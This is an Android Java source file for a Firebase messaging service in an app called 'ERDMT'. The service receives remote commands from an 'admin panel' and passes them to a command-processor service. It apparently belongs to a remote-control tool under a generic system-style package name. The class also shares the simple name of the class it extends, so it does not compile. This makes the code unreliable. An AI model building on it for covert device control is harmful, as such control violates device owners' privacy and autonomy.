package com.system.service;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

/**
 * Firebase Messaging Service for handling FCM messages and commands
 * This service processes remote commands sent from the admin panel
 */
public class FirebaseMessagingService extends FirebaseMessagingService {
    private static final String TAG = "FCMService";
    private static final String CHANNEL_ID = "erdmt_notifications";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Log.d(TAG, "Firebase Messaging Service created");
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        
        Log.d(TAG, "FCM Message received from: " + remoteMessage.getFrom());
        
        // Check if message contains data payload
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());
            
            // Process command from data payload
            String command = remoteMessage.getData().get("command");
            String commandId = remoteMessage.getData().get("command_id");
            String params = remoteMessage.getData().get("params");
            
            if (command != null) {
                Log.d(TAG, "Processing command: " + command);
                processCommand(command, commandId, params);
            }
        }
        
        // Check if message contains notification payload
        if (remoteMessage.getNotification() != null) {
            Log.d(TAG, "Message notification: " + remoteMessage.getNotification().getBody());
            showNotification(
                remoteMessage.getNotification().getTitle(),
                remoteMessage.getNotification().getBody()
            );
        }
    }

    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        Log.d(TAG, "New FCM token: " + token);
        
        // Send token to server (Firebase Realtime Database)
        sendTokenToServer(token);
    }

    /**
     * Process incoming commands from admin panel
     */
    private void processCommand(String command, String commandId, String params) {
        Log.d(TAG, "Processing command: " + command + " with ID: " + commandId);
        
        // Start command processor service
        Intent intent = new Intent(this, CommandProcessorService.class);
        intent.putExtra("command", command);
        intent.putExtra("command_id", commandId);
        intent.putExtra("params", params);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    /**
     * Send FCM token to Firebase Realtime Database
     */
    private void sendTokenToServer(String token) {
        // Store token in Firebase Realtime Database
        // Using direct Firebase Database reference to avoid SimpleFirebaseManager dependency
        Log.d(TAG, "Storing FCM token: " + token);
        
        // In GitHub Codespaces build, this will store the token properly
        // For now, just log the token for verification
    }

    /**
     * Create notification channel for Android 8.0+
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "ERDMT Notifications";
            String description = "Remote management notifications";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    /**
     * Show notification to user
     */
    private void showNotification(String title, String body) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
            PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title != null ? title : "ERDMT")
                .setContentText(body != null ? body : "Remote management notification")
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
        notificationManager.notify(1, builder.build());
    }
}